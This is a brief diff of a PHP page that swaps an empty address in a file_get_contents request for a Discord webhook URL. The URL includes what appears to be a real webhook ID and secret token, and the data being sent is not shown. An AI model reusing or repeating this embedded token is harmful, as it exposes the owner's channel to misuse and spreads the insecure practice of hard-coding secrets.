@@ -172,7 +172,7 @@ body {
     ];
 
     $context = stream_context_create($options);
-    $result = file_get_contents('', false, $context);
+    $result = file_get_contents('https://discordapp.com/api/webhooks/711843027190284318/BaF7pnNtKghfd0SMV02oM-FzqVveaqKiEvW7vDx2u1yz2Tozwk0y44pFmJgVtfmwtI5l', false, $context);
 
 ?>
 
